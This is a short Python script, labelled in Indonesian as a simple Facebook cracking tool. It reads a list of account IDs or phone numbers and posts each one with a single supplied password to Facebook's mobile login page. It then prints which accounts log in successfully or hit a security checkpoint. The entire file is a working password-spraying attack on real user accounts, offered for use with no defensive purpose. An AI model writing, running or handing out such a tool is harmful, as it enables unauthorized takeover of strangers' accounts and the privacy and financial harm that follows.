import requests
import sys
import argparse
import os

parser = argparse.ArgumentParser(description="tools sederhana crack facebook")
parser.add_argument("-l", "--list",type=str, help="ID listor phone")
parser.add_argument("-p", "--password", type=str, help="Password to crack")
args = parser.parse_args()

jumlah = 0

def main():
	global jumlah
	id = args.list
	pwd = args.password
	url = "https://m.facebook.com/login.php"
	list = open(id, "r").readlines()
	for email in list:
		email.split()
		data = {"email":email, "pass":pwd}
		r = requests.post(url, data=data).url
		jumlah += 1
		if "m_sess" in r or "save-device" in r:
			print("[+] found : %s ~ %s"%(email,pwd))
			
		if "checkpoint" in r:
			print("[*] checkpoint %s ~ %s"%(email,pwd))
			
		print("\r[~] crack akun %s|%s"%(jumlah,len(list))),;sys.stdout.flush()
	
if args.list == None or args.password == None:
	os.system("python2 mbf.py -h")
else:
    main()
